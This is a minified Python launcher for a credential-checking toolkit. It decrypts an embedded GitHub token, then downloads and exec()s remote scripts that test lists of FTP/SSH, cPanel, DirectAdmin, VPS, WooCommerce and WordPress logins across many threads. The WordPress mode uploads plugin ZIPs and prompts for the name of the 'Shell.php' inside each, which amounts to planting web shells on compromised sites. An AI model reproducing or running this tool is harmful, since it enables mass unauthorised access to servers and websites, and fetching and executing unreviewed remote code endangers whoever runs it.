_C='[ERROR] Invalid selection.'
_B='Authorization'
_A=None
import re,os,requests,hashlib
from cryptography.hazmat.primitives.ciphers import Cipher,algorithms,modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
import base64,pickle
from colorama import Fore,Style,init
import datetime,shutil,math
init(autoreset=True)
def decrypt_token(encrypted_data,key):encrypted_data=base64.b64decode(encrypted_data);iv=encrypted_data[:16];cipher=Cipher(algorithms.AES(key),modes.CBC(iv),backend=default_backend());decryptor=cipher.decryptor();decrypted_data=decryptor.update(encrypted_data[16:])+decryptor.finalize();unpadder=padding.PKCS7(128).unpadder();unpadded_data=unpadder.update(decrypted_data)+unpadder.finalize();return unpadded_data.decode('utf-8')
encrypted_token_permanent=b'fMTyislmDDvl3qA5v6DW8EQLp68QQx5l/g67C7K+BVIlqeSez+oVs47ynG2pdOVpQeoS3jz2DSZRxdWmICfxGkw367aUgooPWkmXavs+1Ec9oOyqkRhZ6dD7/A7q35Zs8O7e4kPxfOlwKNHuRl4IAA=='
key_token_permanent=b'ad4deb9a922b097682fb5501469c72ee'
PERMANENT_TOKEN=decrypt_token(encrypted_token_permanent,key_token_permanent)
TOKEN_FILE='token.pkl'
def decrypt_data(encrypted_data,key):encrypted_data_bytes=base64.b64decode(encrypted_data);md5_key=hashlib.md5(key.encode('utf-8')).digest();cipher=Cipher(algorithms.AES(md5_key),modes.CBC(md5_key[:16]),backend=default_backend());decryptor=cipher.decryptor();decrypted_data=decryptor.update(encrypted_data_bytes)+decryptor.finalize();unpadder=padding.PKCS7(128).unpadder();original_data=unpadder.update(decrypted_data)+unpadder.finalize();return original_data.decode()
def get_token_from_github_url(url,key_input):
	try:
		headers={_B:f"token {PERMANENT_TOKEN}"};print(f"{Fore.YELLOW}[INFO]{Style.RESET_ALL} Akses to server...");response=requests.get(url,headers=headers)
		if response.status_code==200:
			encrypted_token=response.text.strip();print(f"{Fore.YELLOW}[INFO]{Style.RESET_ALL} Encrypted token form server: {Fore.YELLOW}{encrypted_token[:20]}...{Style.RESET_ALL}");decrypted_final_encrypted=decrypt_data(encrypted_token,key_input);decrypted_key_and_token=decrypt_data(decrypted_final_encrypted,key_input);key,encrypted_token=decrypted_key_and_token.split('|',1);decrypted_token=decrypt_data(encrypted_token,key_input);print(f"{Fore.GREEN}[SUCCESS]{Style.RESET_ALL} generate token : {Fore.YELLOW}{decrypted_token[-15:]}{Style.RESET_ALL}")
			with open(TOKEN_FILE,'wb')as f:pickle.dump(decrypted_token,f)
			print(f"{Fore.YELLOW}[INFO]{Style.RESET_ALL} Token saved to file: {Fore.YELLOW}{TOKEN_FILE}.{Style.RESET_ALL}");return decrypted_token
		else:print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Failed to retrieve data from server. Status code: {response.status_code}");return
	except requests.exceptions.RequestException as e:print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} An error occurred while retrieving data from the server: {e}");return
	except Exception as e:print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} An error occurred while retrieving the token: {e}");return
def load_token_from_file():
	if os.path.isfile(TOKEN_FILE):
		with open(TOKEN_FILE,'rb')as f:return pickle.load(f)
def check_rate_limit(token):
	B='core';A='resources';url='https://api.github.com/rate_limit';headers={_B:f"Bearer {token}"};response=requests.get(url,headers=headers);terminal_width=shutil.get_terminal_size().columns
	def center_text(text):return text.center(terminal_width)
	if response.status_code==200:data=response.json();remaining=data[A][B]['remaining'];reset=data[A][B]['reset'];reset_time=datetime.datetime.fromtimestamp(reset);print(Fore.YELLOW+center_text('[INFO] Rate limit status [INFO]'));print(center_text(f"Request : {remaining} /jam"));print(center_text(f"Reset : {reset_time}"));print(center_text(f"Countdown reset : {reset_time-datetime.datetime.now()}"))
	else:print(center_text(f"[ERROR] Failed to check rate limit. Status code: {response.status_code}"))
def execute_script_from_url(url,file_name,max_workers,token,plugin_files=_A):
	H='process_directadmin_file';G='validate_vps';F='run_script';E='run_woo';D='process_login_file';C='process_ftp_ssh';B='clean_duplikat';A='process_filter'
	try:
		headers={_B:f"Bearer {token}"};response=requests.get(url,headers=headers)
		if response.status_code==200:
			script=response.text;local_scope={};exec(script,local_scope)
			if A in local_scope:process_filter=local_scope[A];process_filter()
			elif B in local_scope:clean_duplikat=local_scope[B];clean_duplikat()
			elif C in local_scope:process_ftp_ssh=local_scope[C];process_ftp_ssh(file_name,max_workers)
			elif D in local_scope:process_login_file=local_scope[D];process_login_file(file_name,max_workers)
			elif E in local_scope:run_woo=local_scope[E];run_woo(file_name,max_workers)
			elif F in local_scope:run_script=local_scope[F];run_script(file_name,max_workers,plugin_files)
			elif G in local_scope:validate_vps=local_scope[G];validate_vps(file_name,max_workers)
			elif H in local_scope:process_directadmin_file=local_scope[H];process_directadmin_file(file_name,max_workers)
			else:print('[ERROR] No matching function found in the script.')
		else:print(f"[ERROR] Failed to download script. Status code: {response.status_code}")
	except Exception as e:print(f"[ERROR] There is an error: {e}")
def list_txt_files_in_folder(folder_name):
	if not os.path.isdir(folder_name):print(f"[ERROR] Folder {folder_name} not found.");return[]
	files=[f for f in os.listdir(folder_name)if f.endswith('.txt')]
	def alphanumeric_sort_key(f):return[int(part)if part.isdigit()else part.lower()for part in re.split('(\\d+)',f)]
	files.sort(key=alphanumeric_sort_key);return files
def choose_or_input_file_in_folder():
	folder_name=input(f"{Fore.CYAN}Enter name folder .txt file (default ↵ 'filter_result'):{Style.RESET_ALL} {Fore.YELLOW}")
	if not folder_name:folder_name='hasil_filter'
	files=list_txt_files_in_folder(folder_name)
	if not files:print(f"[INFO] No .txt files found in folder {folder_name}.");return _A,_A
	print(f"{Fore.CYAN}Select a file from the following list (enter number):")
	for(idx,file)in enumerate(files,1):print(f"{Fore.YELLOW}{idx}. {file}")
	user_input=input(f"{Fore.CYAN}Choice the number or type the file name:{Style.RESET_ALL} {Fore.YELLOW}")
	if user_input.isdigit():
		choice=int(user_input)
		if choice<1 or choice>len(files):print(_C);return _A,_A
		return folder_name,files[choice-1]
	else:
		file_name=user_input
		if not file_name.endswith('.txt'):print('[ERROR] The file name must end in .txt.');return _A,_A
		if not os.path.isfile(os.path.join(folder_name,file_name)):print(f"[ERROR] File {file_name} not found in folder {folder_name}.");return _A,_A
		return folder_name,file_name
def move_file_to_new_folder(file_path,target_folder):
	if not os.path.exists(target_folder):os.makedirs(target_folder)
	file_name=os.path.basename(file_path);target_path=os.path.join(target_folder,file_name)
	try:shutil.move(file_path,target_path)
	except Exception as e:print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Failed to move file: {e}")
def center_text(text):
	terminal_width=shutil.get_terminal_size().columns;clean_text=''.join(c for c in text if c not in(Fore.YELLOW,Fore.CYAN,Style.RESET_ALL));text_length=len(clean_text)
	if text_length<terminal_width:centered_text=clean_text.center(terminal_width);return text.replace(clean_text,centered_text)
	else:return text
def display_ascii_art():ascii_art='\n   *        )             )     )  (    (     \n (  `    ( /(    *   ) ( /(  ( /(  )\\ ) )\\ )  \n )\\))(   )\\()) ` )  /( )\\()) )\\())(()/((()/(  \n((_)()\\ ((_)\\   ( )(_)|(_)\\ ((_)\\  /(_))/(_)) \n(_()((_)_ ((_)( _(_())  ((_)  ((_)(_)) (_))   \n    ';return ascii_art.strip()
def display_ascii_art2():ascii_art2=' \n|  \\/  \\ \\ / / |_   _| / _ \\ / _ \\| |  / __|  \n| |\\/| |\\ V /    | |  | (_) | (_) | |__\\__ \\  \n|_|  |_| |_|     |_|   \\___/ \\___/|____|___/  \n    ';return ascii_art2.strip()
def display_combined_ascii_art():
	ascii1=display_ascii_art();ascii2=display_ascii_art2()
	if ascii1 and ascii2:
		for line in ascii1.split('\n'):print(Fore.RED+center_text(line.rstrip()))
		for line in ascii2.split('\n'):print(Fore.CYAN+center_text(line.rstrip()))
	else:print('Error: One of the ASCII art functions returned None.')
def clear_terminal():
	if os.name=='nt':os.system('cls')
	else:os.system('clear')
def detect_zip_files(folder_path):'Deteksi semua file .zip di dalam folder.';zip_files=[f for f in os.listdir(folder_path)if f.endswith('.zip')];return zip_files
def main():
	C='(Soon)';B='WooCommerce';A='─';clear_terminal();token_url='https://raw.githubusercontent.com/jonis210/token/main/key213.txt';display_combined_ascii_art();decrypted_token=load_token_from_file()
	if decrypted_token is _A:
		while True:
			decryption_key=input(f"{Fore.CYAN}\nInput Key: {Fore.YELLOW}");decrypted_token=get_token_from_github_url(token_url,decryption_key)
			if decrypted_token is _A:print('[ERROR] Token failed to decrypt. Please try again.')
			else:break
	else:clear_terminal();display_combined_ascii_art();terminal_width=shutil.get_terminal_size().columns;line=A*31;centered_line=line.center(terminal_width);print(Fore.GREEN+centered_line);check_rate_limit(decrypted_token);print(f"{Fore.GREEN}{A*shutil.get_terminal_size().columns}");print(f"{Fore.YELLOW}[INFO]{Style.RESET_ALL} {Fore.CYAN}Token file is found: {Fore.YELLOW}{TOKEN_FILE}{Style.RESET_ALL}")
	urls={'FILTERV2(work)':'https://raw.githubusercontent.com/jonis210/loginbaru1/main/filter9999.py','DUPLIKATV2(work)':'https://raw.githubusercontent.com/jonis210/loginbaru1/main/duplikate9900.py','FTPSFTP(Soon)':'https://raw.githubusercontent.com/jonis210/loginbaru1/main/ftpsftp.py','CPWHM(Soon)':'https://raw.githubusercontent.com/jonis210/loginbaru1/main/cpwhm.py',B:'https://raw.githubusercontent.com/jonis210/loginbaru1/main/woodetect9900.py','WORDPRESS(Woo,Filemanager,uplodPlugins)':'https://raw.githubusercontent.com/jonis210/loginbaru1/main/wordpressALLdetect-woo-Filemanager-Addnewplugin9999.py','VPS(Soon)':'https://raw.githubusercontent.com/jonis210/loginbaru1/main/vps.py','DIRECTADMIN(Soon)':'https://raw.githubusercontent.com/jonis210/loginbaru1/main/directadmin.py'};print(Fore.GREEN+A*38);print(f"{Fore.CYAN}Select the validation you want to run:");total_items=len(urls)
	for idx in range(0,4):left_idx=idx+1;left_key=list(urls.keys())[idx];left_display=f"{left_idx}. {left_key.ljust(20)}";right_idx=idx+5;right_key=list(urls.keys())[idx+4]if idx+4<total_items else'';right_display=f"{right_idx}. {right_key}"if right_key else'';left_display=left_display.replace(C,f"{Fore.RED}(Soon){Style.RESET_ALL}");right_display=right_display.replace(C,f"{Fore.RED}(Soon){Style.RESET_ALL}");print(f"{Fore.YELLOW}{left_display} {Fore.YELLOW}{right_display}")
	print(f"{Fore.GREEN}{A*shutil.get_terminal_size().columns}");choice=int(input(f"{Fore.CYAN}Input choice (1,2,3...): {Fore.YELLOW}"))
	if choice<1 or choice>len(urls):print(_C);return
	selected_script=list(urls.values())[choice-1];selected_script_name=list(urls.keys())[choice-1]
	if choice in[1,2]:execute_script_from_url(selected_script,_A,_A,decrypted_token)
	else:
		folder_mapping={3:'FTPSFTP',4:'CPWHM',5:B,6:'WORDPRESS',7:'VPS',8:'DIRECTADMIN'};target_folder=folder_mapping.get(choice);folder_name,file_name=choose_or_input_file_in_folder()
		if not file_name:return
		file_path=os.path.join(folder_name,file_name);move_file_to_new_folder(file_path,target_folder);max_workers=int(input(f"{Fore.CYAN}Input Max Threads: {Style.RESET_ALL} {Fore.YELLOW}"));plugin_files=[]
		if choice==6:
			try:
				num_plugins=int(input(f"{Fore.CYAN}How many plugin .ZIP files do you want to upload: {Fore.YELLOW}"))
				if num_plugins<=0:print(f"{Fore.RED}You must upload at least one plugin.{Style.RESET_ALL}");return
			except ValueError:print(f"{Fore.RED}Invalid input. Please enter a number.{Style.RESET_ALL}");return
			plugin_folder='plugin'
			if not os.path.exists(plugin_folder):print(f"{Fore.RED}Folder '{plugin_folder}' not found. Please make sure it exists.{Style.RESET_ALL}");return
			zip_files=detect_zip_files(plugin_folder)
			if not zip_files:print(f"{Fore.RED}No .zip files found in '{plugin_folder}'.{Style.RESET_ALL}");return
			plugin_files=[];print(f"{Fore.CYAN}Available plugin .ZIP files in '{plugin_folder}':{Style.RESET_ALL}")
			for(idx,zip_file)in enumerate(zip_files,1):print(f"{Fore.YELLOW}{idx}. {zip_file}{Style.RESET_ALL}")
			for i in range(1,num_plugins+1):
				try:
					zip_choice=int(input(f"{Fore.CYAN}select the {Fore.YELLOW}#{i} {Fore.CYAN}zip file {Fore.YELLOW}(by number): "))
					if zip_choice<1 or zip_choice>len(zip_files):print(f"{Fore.RED}Invalid choice. Please select a valid number.{Style.RESET_ALL}");continue
				except ValueError:print(f"{Fore.RED}Invalid input. Please enter a number.{Style.RESET_ALL}");continue
				selected_zip_file=zip_files[zip_choice-1];plugin_inner_name=input(f"{Fore.CYAN}Enter name of Shell.php in {Style.RESET_ALL}{Fore.YELLOW}{selected_zip_file}{Fore.YELLOW}: ").strip();plugin_files.append((os.path.join(plugin_folder,selected_zip_file),plugin_inner_name))
		clear_terminal();display_combined_ascii_art();terminal_width=shutil.get_terminal_size().columns;line=A*31;centered_line=line.center(terminal_width);print(Fore.GREEN+centered_line);check_rate_limit(decrypted_token);print(f"{Fore.GREEN}{A*shutil.get_terminal_size().columns}")
		if choice==6:
			print(f"{Fore.YELLOW}[INFO]{Fore.CYAN} Check For {Fore.YELLOW}{selected_script_name}{Fore.CYAN} Use {Fore.YELLOW}{max_workers} {Fore.CYAN}Threads {Fore.CYAN}for List {Fore.YELLOW}{file_name}{Style.RESET_ALL}")
			for(i,(plugin_zip_name,plugin_inner_name))in enumerate(plugin_files,start=1):
				if i==1:print(f"{Fore.YELLOW}[INFO] {Style.RESET_ALL}{i}.{Fore.CYAN} Plugin File {Fore.YELLOW}{plugin_zip_name} {Fore.CYAN}Name Shell.php {Fore.YELLOW}{plugin_inner_name}")
				else:print(f"       {i}. {Fore.CYAN}Plugin File {Fore.YELLOW}{plugin_zip_name} {Fore.CYAN}Name Shell.php {Fore.YELLOW}{plugin_inner_name}")
			print(f"{Fore.GREEN}{A*shutil.get_terminal_size().columns}")
		else:print(f"{Fore.YELLOW}[INFO]{Fore.CYAN} Check For {Fore.YELLOW}{selected_script_name}{Fore.CYAN} Use {Fore.YELLOW}{max_workers} {Fore.CYAN}Threads{Style.RESET_ALL} {Fore.CYAN}for List {Fore.YELLOW}{file_name}");print(f"{Fore.GREEN}{A*shutil.get_terminal_size().columns}")
		if choice==6:execute_script_from_url(selected_script,os.path.join(target_folder,file_name),max_workers,decrypted_token,plugin_files)
		else:execute_script_from_url(selected_script,os.path.join(target_folder,file_name),max_workers,decrypted_token)
if __name__=='__main__':main()